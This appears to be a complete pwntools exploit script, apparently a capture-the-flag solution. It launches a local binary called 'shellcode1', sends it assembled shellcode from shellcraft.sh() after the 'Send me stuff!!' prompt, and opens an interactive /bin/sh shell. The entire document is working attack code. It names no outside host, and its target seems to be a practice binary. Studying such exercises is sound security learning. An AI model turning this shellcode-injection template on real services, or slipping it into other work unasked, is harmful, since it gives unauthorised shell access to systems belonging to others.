from pwn import *		
context(log_level='debug',os='linux',arch='i386')
pwnfile = './shellcode1'
io=process(pwnfile)

elf = ELF(pwnfile)

pay = asm(shellcraft.sh())
log.success("pay_len = "+hex(len(pay)))

io.sendlineafter("Send me stuff!!",pay)

io.interactive()


#execve('/bin/sh',0,0)
